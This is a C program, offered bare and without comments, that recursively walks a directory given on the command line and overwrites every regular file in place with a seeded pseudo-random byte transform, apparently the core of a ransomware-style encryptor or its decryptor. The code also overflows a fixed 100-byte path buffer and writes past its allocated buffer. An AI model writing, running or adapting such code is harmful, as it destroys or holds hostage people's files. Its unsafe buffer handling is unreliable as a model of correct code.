#include <dirent.h>
#include <stdio.h>
#include <errno.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>

unsigned int seed;

int sameStr(char* base, char* sub, int num)
{
    int same = 0;
    for (int i = 0; i < num; i++)
    {
        if (*base == *sub)
            same++;
        base++;
        sub++;
    }
    if (same == num)
        return 1;
    return 0;
}

void encryption(char* filename)
{
    FILE* infile = fopen(filename, "rb");

    fseek(infile, 0L, SEEK_END);
    unsigned int bufferSize = ftell(infile);
    rewind(infile);

    unsigned char* buffer = (unsigned char*)malloc(sizeof(unsigned char) * bufferSize);
    void* bufferStart = buffer;

    srand(seed);
    while (!(feof(infile)))
    {
        *buffer = (getc(infile) DEF_X rand() % 256) % 256;
        buffer++;
    }
    fclose(infile);

    *buffer = '\0';
    buffer = bufferStart;

    FILE* outfile = fopen(filename, "wb");
    fwrite(buffer, bufferSize, 1, outfile);
    fclose(outfile);
}

void recursiveWalk(char* path)
{
    DIR *d;
    struct dirent *dir;
    d = opendir(path);
    char full_path[100];

    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if(dir->d_type == DT_REG) {
                full_path[0] = '\0';
                strcat(full_path, path);
                strcat(full_path, "/");
                strcat(full_path, dir->d_name);
                encryption(full_path);
                printf("file: %s\n", full_path);
            } else if ((dir->d_type == DT_DIR) && (!(sameStr(dir->d_name, "..", 2) || sameStr(dir->d_name, "..", 1)))) {
                full_path[0] = '\0';
                strcat(full_path, path);
                strcat(full_path, "/");
                strcat(full_path, dir->d_name);
                recursiveWalk(full_path);
            }
        }
        closedir(d);
    }
}

int main(int argc, char** argv)
{
    seed = atoi(argv[2]);
    recursiveWalk(argv[1]);

    return 1;
}
